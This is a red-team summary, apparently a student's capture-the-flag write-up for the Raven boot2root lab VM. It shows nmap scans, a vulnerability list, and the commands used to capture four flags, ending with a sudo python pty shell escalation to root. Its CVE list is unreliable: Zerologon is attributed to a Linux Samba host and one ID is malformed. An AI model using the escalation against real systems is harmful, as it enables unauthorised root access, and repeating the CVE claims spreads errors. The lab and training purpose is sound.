## Red Team: Summary of Operations
### Table of Contents
  - Exposed Services
  - Critical Vulnerabilities
  - Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

```
$ nmap -sP 192.168.1.1-255
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 15:59 EDT
Nmap scan report for 192.168.1.1 (192.168.1.1)
Host is up (0.26s latency).
MAC Address: 18:90:68:97:97:57 (Unknown)
Nmap scan report for 192.168.1.90 (192.168.1.90)
Host is up (0.020s latency).
MAC Address: 88:E9:FE:65:17:B0 (Unknown)
Nmap scan report for 192.168.1.100 (192.168.1.100)
Host is up (0.020s latency).
MAC Address: 88:E9:FE:65:16:F0 (Unknown)
Nmap scan report for 192.168.1.115 (192.168.1.115)
Host is up (0.020s latency).
MAC Address: 88:E9:FE:65:16:C0 (Unknown)
```
Nmap scan results for each machine reveal the below services and OS details:
```
$ nmap -sV 192.168.1.110
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 16:38 PDT
Nmap scan report for 192.168.1.110
Host is up (0.00082s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
```

This scan identifies the services below as potential points of entry:
 - Target 1
    - Port 22
    - Port 80
    - Port 111
    - Port 139

The following vulnerabilities were identified on each target:
 - Target 1
    - CVE-2020-1472 (9.3) An elevation of privilege vulnerability exists when an attacker establishes a vulnerable netlogon secure channel connection to a domain controller, using the netlogon remote protocol
    - CVE-2020-101745 (7.8) A flaw was found in all Samba versions before 4.10.17, before 4.11.11 and before 4.12.4 in the way it processed NetBios over TCP/IP. This flaw allows a remote attacker to cause the Samba server to consume excessive CPU use, resulting in a denial of service. This highest threat from this vulnerability is to system availability

## Exploitation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
 - Target 1
   - flag1.txt: flag1{b9bbcb33e11b80be759c4e844862482d}
   - Exploit Used
```
# Search for the word `flag` in all html files to find flag1
michael@target1:/var/www$ grep -RE flag html
# Prints very long output -- but, the very last line contains flag1!
./vendor/examples/scripts/XRegExp.js:	RegExp.prototype.validate = function (s) {var r = RegExp("^(?:" + this.source + ")$(?!\\s)", getNativeFlags(this)); if (this.global) this.lastIndex = 0; return s.search(r) === 0;};
./vendor/composer.lock:	"stability-flags": [],
./service.html:             	<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->

# Alternatively, search for the flag directly
michael@target1:/var/www$ grep -REioh flag[[:digit:]]{.+} html
flag1{b9bbcb33e11b80be759c4e844862482d}
```
- Target 2
   - flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
   - Exploit Used
```
# Move to the website root directory to find flag2
michael@target1:~$ cd /var/www
michael@target1:/var/www$ ls
flag2.txt
michael@target1:/var/www$ cat flag2.txt
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
```
- Target 3
   - flag3{afc01ab56b50591e7dccf93122770cd2} 
   - Exploit Used
```
-- Find flag3.txt in the blog
mysql> select * from wp_posts;
-- Prints a lot of text; scroll through it to find flag3: flag3{afc01ab56b50591e7dccf93122770cd2}
| flag4    	|          	| inherit 	| closed     	| closed  	|           	| 4-revision-v1 |     	|    	| 2018-08-12 23:31:59 | 2018-08-12 23:31:59 |                   	|       	4 | http://raven.local/wordpress/index.php/2018/08/12/4-revision-v1/ |      	0 | revision  |            	|         	0 |
|  7 |       	2 | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 | flag3{afc01ab56b50591e7dccf93122770cd2}                                                                         
```
- Target 4
   - flag4{715dea6c055b9fe3337544932f2941ce} 
   - Exploit Used
```
$ sudo python -c 'import pty;pty.spawn("/bin/bash");'
root@TARGET1:/ > id
uid=0(root) gid=0(root) groups=0(root)
root@TARGET1:/ > cd /root
root@TARGET1:/root > ls
flag4.txt
root@TARGET1:/root > cat flag4.txt
______                 	 
| ___ \                	 
| |_/ /__ ___   _____ _ __  
|	/  /  _` \ \ / / _ \ '_ \
| |\ \ (_| |\ V /  __/ | | |
\_| \_\__,_| \_/ \___|_| |_|

                        
flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought:

@mccannwj / wjmccann.github.io
```


